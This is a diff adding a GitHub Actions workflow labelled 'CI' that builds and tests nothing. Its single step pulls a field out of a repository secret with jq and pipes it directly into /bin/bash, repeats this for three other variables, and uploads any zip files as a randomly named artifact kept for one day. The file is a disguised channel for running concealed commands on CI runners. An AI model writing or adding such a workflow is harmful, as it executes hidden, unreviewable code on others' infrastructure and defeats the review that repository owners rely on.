@@ -1,0 +1,24 @@
+name: CI
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          uci4: ${{ secrets.uci4 }}
+        run: |
+          printf '%s' "$uci4" | jq -r .mt13 | /bin/bash
+          echo $ce85 | jq -r .y8 | /bin/bash
+          printf '%s' "$qat800" | jq -r .sbn97 | /bin/bash
+          echo $u7 | jq -r .m1 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: N4rQgqT0
+          path: "*.zip"
+          retention-days: 1
